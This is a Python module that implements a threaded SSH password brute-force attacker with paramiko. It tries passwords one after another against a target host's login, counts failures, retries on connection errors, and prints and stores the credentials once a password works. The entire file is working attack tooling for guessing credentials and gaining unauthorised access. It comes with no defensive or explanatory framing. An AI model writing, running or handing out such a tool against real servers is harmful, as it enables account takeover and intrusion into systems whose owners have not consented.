import paramiko
from target import Target, Attacker


class SSHAttacker(Attacker):
    """
    A class representing SSH-attacking thread
    """

    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self, password) -> bool:
        """
        Try to connect to the host with given password.

        :param password: the password that we try to authenticate with
        :type password: str
        :return: True if succeed/failed to authenticate, False if connection error occured
        """
        try:
            sshclient = paramiko.SSHClient()
            sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            sshclient.connect(
                hostname=self.target.host,
                port=self.target.port,
                username=self.target.login,
                timeout=3,
                password=password,
                allow_agent=False,
                look_for_keys=False
            )
        # authentication failure
        except paramiko.AuthenticationException:
            self.tries += 1
            self.failed_conns = 0
            print("[%s] Failed attempt against %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, password))
            return True
        # failed to connect to the host
        except paramiko.SSHException:
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            self.failed_conns += 1
            return False
        # failed to connect - other exception
        except Exception:
            print("[%s] Unknown exception while connecting to %s" %
                  (self.name, self.target.host))
            self.failed_conns += 1
            return False
        # no exceptions occured -> authentication successful
        else:
            self.tries += 1
            self.failed_conns = 0
            SSHAttacker.finish = True
            SSHAttacker.password = password
            SSHAttacker.success = True
            print("[%s] Found credentials for %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, password))
            return True
        finally:
            sshclient.close()

    def run(self):
        while SSHAttacker.finish is False:
            password = self.get_password()
            if password is None:
                continue

            while self.try_connect(password) is False and SSHAttacker.finish is False:
                pass
